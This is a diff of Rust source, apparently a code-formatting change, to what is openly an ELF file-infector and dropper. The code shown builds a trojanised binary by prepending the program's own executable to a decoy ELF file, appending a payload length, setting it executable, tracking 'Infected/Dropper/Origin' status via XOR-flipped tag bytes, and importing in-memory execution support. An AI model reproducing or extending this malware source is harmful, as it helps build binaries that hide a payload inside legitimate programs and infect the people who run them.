@@ -1,9 +1,9 @@
+use clap::Parser;
+use memfd_exec::MemFdExecutable;
 use std::env::{args, current_exe, vars};
 use std::fs::{File, read};
 use std::io::{Read, Write};
 use std::os::unix::fs::PermissionsExt;
-use clap::Parser;
-use memfd_exec::MemFdExecutable;
 
 #[derive(Parser, Debug)]
 struct Args {
@@ -21,25 +21,25 @@ pub enum InfectionStatus {
 
 pub fn create_dropper() -> Result<(), Box<dyn std::error::Error>> {
     {
-    let args = Args::parse();
-    
-    let decoy_path = &args.decoy_path;
-    let output_path = &args.output_path;
-    assert!(is_elf(decoy_path));
+        let args = Args::parse();
 
-    let mut destination_file = File::create(output_path)?;
+        let decoy_path = &args.decoy_path;
+        let output_path = &args.output_path;
+        assert!(is_elf(decoy_path));
 
-    let own_path = current_exe()?;
-    let mut own_contents: Vec<u8> = read(own_path)?;
-    set_dropper_tag(&mut own_contents);
+        let mut destination_file = File::create(output_path)?;
 
-    let payload_length: [u8; 8] = own_contents.len().to_le_bytes();
-    let decoy_contents: Vec<u8> = read(decoy_path)?;
+        let own_path = current_exe()?;
+        let mut own_contents: Vec<u8> = read(own_path)?;
+        set_dropper_tag(&mut own_contents);
 
-    destination_file.write_all(&own_contents)?;
-    destination_file.write_all(&decoy_contents)?;
-    destination_file.write_all(&payload_length)?;
-    destination_file.set_permissions(PermissionsExt::from_mode(0o755))?;
+        let payload_length: [u8; 8] = own_contents.len().to_le_bytes();
+        let decoy_contents: Vec<u8> = read(decoy_path)?;
+
+        destination_file.write_all(&own_contents)?;
+        destination_file.write_all(&decoy_contents)?;
+        destination_file.write_all(&payload_length)?;
+        destination_file.set_permissions(PermissionsExt::from_mode(0o755))?;
     }
 
     Ok(())
@@ -101,15 +101,15 @@ pub fn get_own_infection_status() -> InfectionStatus {
     let dropper_tag = dropper_tag_str.as_bytes();
 
     if is_tag_in_file_buffer(infect_tag, &own_contents) {
-        InfectionStatus::Infected 
+        InfectionStatus::Infected
     } else if is_tag_in_file_buffer(dropper_tag, &own_contents) {
-        InfectionStatus::Dropper 
+        InfectionStatus::Dropper
     } else {
-        InfectionStatus::Origin 
+        InfectionStatus::Origin
     }
 }
 
-fn is_tag_in_file_buffer(tag : &[u8], file_buffer : &[u8]) -> bool {
+fn is_tag_in_file_buffer(tag: &[u8], file_buffer: &[u8]) -> bool {
     let tag_len = tag.len();
     match file_buffer
         .windows(tag_len)
@@ -120,7 +120,7 @@ fn is_tag_in_file_buffer(tag : &[u8], file_buffer : &[u8]) -> bool {
     }
 }
 
-fn make_first_letter_uppercase(lower_string :&str) -> String {
+fn make_first_letter_uppercase(lower_string: &str) -> String {
     let mut chars = lower_string.chars();
     match chars.next() {
         Some(c) => c.to_uppercase().chain(chars).collect(),
@@ -140,11 +140,9 @@ fn set_infected_tag(file_contents: &mut [u8]) {
                 *byte ^= 0x20;
             }
         }
-    }
-    else {
+    } else {
         panic!("Could not find tag in myself!");
     }
-
 }
 
 fn set_dropper_tag(file_contents: &mut [u8]) {
@@ -169,4 +167,3 @@ fn is_elf(file_path: &str) -> bool {
 
     elf_magic_number == magic_number
 }
-
